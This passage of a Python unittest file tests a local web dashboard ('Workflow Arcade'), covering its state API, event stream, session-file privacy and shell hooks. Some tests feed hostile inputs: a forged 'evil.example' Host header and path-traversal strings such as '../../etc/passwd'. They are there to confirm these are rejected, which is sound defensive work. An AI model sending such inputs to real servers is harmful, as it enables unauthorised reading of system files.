        r = c.getresponse()
        return r.status, r.read(), r

    def test_page_and_state(self):
        status, body, r = self.get("/")
        self.assertEqual(status, 200)
        self.assertIn(b"Workflow Arcade", body)
        self.assertIn("frame-ancestors 'none'", r.getheader("Content-Security-Policy"))
        self.hub.publish({"type": "command", "cmd": "ls", "cwd": "."})
        status, body, _ = self.get("/api/state")
        state = json.loads(body)
        self.assertEqual(state["snapshot"]["project"], "demo")
        self.assertEqual(state["events"][-1]["cmd"], "ls")

    def test_rejects_foreign_host_and_writes(self):
        self.assertEqual(self.get("/", host="evil.example:80")[0], 403)
        self.assertEqual(self.get("/api/state", method="POST")[0], 405)

    def test_sessions_cannot_escape_folder(self):
        self.assertIsNone(read_session(self.home, "../../etc/passwd"))
        self.assertEqual(self.get("/api/session?id=..%2F..%2Fx.jsonl")[0], 404)
        status, body, _ = self.get("/api/session?id=20260101-120000-demo.jsonl")
        self.assertEqual(status, 200)
        self.assertEqual(json.loads(body)[0]["type"], "snapshot")

    @unittest.skipIf(os.name == "nt", "POSIX permissions")
    def test_session_file_is_private(self):
        mode = (self.home / "20260101-120000-demo.jsonl").stat().st_mode & 0o777
        self.assertEqual(mode, 0o600)

    def test_event_stream(self):
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)
        c.request("GET", "/api/events?after=0", headers={"Host": f"127.0.0.1:{self.port}"})
        r = c.getresponse()
        threading.Timer(0.2, lambda: self.hub.publish({"type": "commit", "sha": "abc1234", "message": "x"})).start()
        deadline = time.time() + 5
        buf = b""
        while b"abc1234" not in buf and time.time() < deadline:
            buf += r.fp.readline()
        self.assertIn(b"abc1234", buf)
        c.close()


class CliTest(unittest.TestCase):
    def test_refuses_home_folder(self):
        with self.assertRaises(SystemExit):
            check_folder(Path.home().resolve())

    def test_hooks_exist(self):
        for shell in ("bash", "zsh", "powershell"):
            self.assertIn("commands.log", HOOKS[shell])


if __name__ == "__main__":
    unittest.main()
